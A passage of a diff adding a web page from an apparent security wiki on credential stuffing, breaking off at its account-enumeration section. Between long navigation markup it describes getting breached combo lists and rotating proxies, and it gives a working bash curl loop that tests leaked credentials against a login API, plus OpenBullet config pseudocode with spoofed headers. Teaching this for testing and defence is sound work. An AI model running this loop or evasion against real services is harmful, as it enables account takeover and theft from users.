@@ -1,0 +1,1919 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Credential Stuffing # Credential Stuffing is an automated account takeover attack where large lists of compromised username/password pairs — sourced from prior data breaches — are tested against unrelated services. It exploits password reuse: credentials leaked from Site A likely unlock accounts on Site B.
+Unlike brute force, it tests known, real credentials — unaffected by password complexity, resistant to dictionary-based defenses. Success rate: 0.2%–2% (1M pairs → 2,000–20,000 compromised accounts).">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Credential Stuffing" />
+<meta property="og:description" content="Credential Stuffing # Credential Stuffing is an automated account takeover attack where large lists of compromised username/password pairs — sourced from prior data breaches — are tested against unrelated services. It exploits password reuse: credentials leaked from Site A likely unlock accounts on Site B.
+Unlike brute force, it tests known, real credentials — unaffected by password complexity, resistant to dictionary-based defenses. Success rate: 0.2%–2% (1M pairs → 2,000–20,000 compromised accounts)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>Credential Stuffing | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class=" active">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Credential Stuffing</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#credential-stuffing">Credential Stuffing</a>
+      <ul>
+        <li><a href="#understanding-credential-stuffing-basics">Understanding Credential Stuffing Basics</a>
+          <ul>
+            <li><a href="#the-stuffing-workflow">The Stuffing Workflow</a></li>
+            <li><a href="#credential-stuffing-vs-brute-force">Credential Stuffing vs. Brute Force</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#exploiting-credential-stuffing">Exploiting Credential Stuffing</a>
+          <ul>
+            <li><a href="#1-account-takeover-ato">1. Account Takeover (ATO)</a></li>
+            <li><a href="#2-account--user-enumeration">2. Account / User Enumeration</a></li>
+            <li><a href="#3-mfa-prompt-bombing-mfa-fatigue">3. MFA Prompt Bombing (MFA Fatigue)</a></li>
+            <li><a href="#4-graphql-batching">4. GraphQL Batching</a></li>
+            <li><a href="#5-legacy--mobile-api-endpoint-discovery">5. Legacy / Mobile API Endpoint Discovery</a></li>
+            <li><a href="#6-sso-pivot">6. SSO Pivot</a></li>
+            <li><a href="#test-cases">Test Cases</a></li>
+          </ul>
+        </li>
+        <li><a href="#bypassing-defences">Bypassing Defences</a>
+          <ul>
+            <li><a href="#1-ip-rotation-via-residential-proxies">1. IP Rotation via Residential Proxies</a></li>
+            <li><a href="#2-request-jitter">2. Request Jitter</a></li>
+            <li><a href="#3-header-spoofing">3. Header Spoofing</a></li>
+            <li><a href="#4-captcha-bypass">4. CAPTCHA Bypass</a></li>
+            <li><a href="#5-tls--behavioral-fingerprint-evasion">5. TLS &amp; Behavioral Fingerprint Evasion</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)</a>
+          <ul>
+            <li><a href="#manual-detection--confirming-a-hit">Manual Detection — Confirming a Hit</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#mitigation--prevention">Mitigation &amp; Prevention</a></li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#notable-incidents">Notable Incidents</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="credential-stuffing">
+  Credential Stuffing
+  <a class="anchor" href="#credential-stuffing">#</a>
+</h1>
+<p>Credential Stuffing is an automated account takeover attack where large lists of compromised username/password pairs — sourced from prior data breaches — are tested against unrelated services. It exploits password reuse: credentials leaked from Site A likely unlock accounts on Site B.</p>
+<p>Unlike brute force, it tests <em>known, real credentials</em> — unaffected by password complexity, resistant to dictionary-based defenses. Success rate: 0.2%–2% (1M pairs → 2,000–20,000 compromised accounts).</p>
+<h2 id="understanding-credential-stuffing-basics">
+  Understanding Credential Stuffing Basics
+  <a class="anchor" href="#understanding-credential-stuffing-basics">#</a>
+</h2>
+<h3 id="the-stuffing-workflow">
+  The Stuffing Workflow
+  <a class="anchor" href="#the-stuffing-workflow">#</a>
+</h3>
+<ol>
+<li><strong>Acquisition</strong> — Obtain a Combo List (Email:Password or Username:Password) from dark web markets, paste sites, or breach repos (Collection #1–5, Naz.API)</li>
+<li><strong>Automation</strong> — Load list into a checker (e.g., OpenBullet 2) configured with the target&rsquo;s login logic, success/failure indicators</li>
+<li><strong>Proxy Rotation</strong> — Route attempts through residential proxies so each request appears from a different legitimate home IP</li>
+<li><strong>Triaging</strong> — Confirmed logins (&ldquo;Hits&rdquo;) are validated and checked for value: saved cards, loyalty balances, admin access</li>
+</ol>
+<h3 id="credential-stuffing-vs-brute-force">
+  Credential Stuffing vs. Brute Force
+  <a class="anchor" href="#credential-stuffing-vs-brute-force">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Brute Force</th>
+<th>Credential Stuffing</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Credential Source</td>
+<td>Generated / wordlists</td>
+<td>Known leaked credentials</td>
+</tr>
+<tr>
+<td>Attack Nature</td>
+<td>Guessing</td>
+<td>Testing</td>
+</tr>
+<tr>
+<td>Password Complexity Defense</td>
+<td>Effective</td>
+<td>Completely ineffective</td>
+</tr>
+<tr>
+<td>Detection Profile</td>
+<td>High volume, single account</td>
+<td>Low volume, distributed across many accounts</td>
+</tr>
+<tr>
+<td>Countermeasure</td>
+<td>Account lockout</td>
+<td>Behavioral analysis, proxy detection</td>
+</tr>
+</tbody>
+</table>
+<h2 id="attack-surface">
+  Attack Surface
+  <a class="anchor" href="#attack-surface">#</a>
+</h2>
+<p><strong>Primary Targets:</strong></p>
+<ol>
+<li>Web login portals</li>
+<li>Mobile API endpoints (<code>/api/v1/login</code>)</li>
+<li>SSO/OAuth flows (Okta, Auth0, Azure AD)</li>
+<li>Password reset flows</li>
+<li>Loyalty/rewards platforms</li>
+<li>Microservices &amp; auth gateways</li>
+</ol>
+<p><strong>Low-Yield / Not Applicable:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Why Stuffing Fails</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OTP-Only flows</td>
+<td>No password to stuff</td>
+</tr>
+<tr>
+<td>Mandatory MFA (TOTP / Hardware Key)</td>
+<td>Second factor required</td>
+</tr>
+<tr>
+<td>Passwordless (Magic Links, Passkeys, FIDO2)</td>
+<td>No credential pair exists</td>
+</tr>
+<tr>
+<td>Certificate-Based Auth (mTLS)</td>
+<td>Device-bound, not replayable</td>
+</tr>
+</tbody>
+</table>
+<h2 id="exploiting-credential-stuffing">
+  Exploiting Credential Stuffing
+  <a class="anchor" href="#exploiting-credential-stuffing">#</a>
+</h2>
+<h3 id="1-account-takeover-ato">
+  1. Account Takeover (ATO)
+  <a class="anchor" href="#1-account-takeover-ato">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Core stuffing loop against a JSON API</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span>: read -r user pass; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  response<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -X POST https://api.target.com/v1/auth <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -d <span style="color:#e6db74">&#34;{\&#34;username\&#34;:\&#34;</span>$user<span style="color:#e6db74">\&#34;, \&#34;password\&#34;:\&#34;</span>$pass<span style="color:#e6db74">\&#34;}&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$response<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#f92672">]]</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;[HIT] </span>$user<span style="color:#e6db74">:</span>$pass<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$response<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;429&#34;</span> <span style="color:#f92672">]]</span> <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &lt; combo_list.txt
+</span></span></code></pre></div><p>OpenBullet 2 Config pseudocode:</p>
+<pre tabindex="0"><code>REQUEST POST /login  body: {email, password}  headers: {UA: &lt;rotated&gt;, X-Forwarded-For: &lt;proxy&gt;}
+SUCCESS KEY:  response contains &#34;access_token&#34; OR status == 302
+FAILURE KEY:  response contains &#34;Invalid&#34; OR status == 401
+BAN KEY:      status == 429 OR response contains &#34;Too many attempts&#34;
+</code></pre><h3 id="2-account--user-enumeration">
+  2. Account / User Enumeration
+  <a class="anchor" href="#2-account--user-enumeration">#</a>
+</h3>
+<p>Confirm which accounts exist before stuffing — reduces noise, focuses the attack.</p>
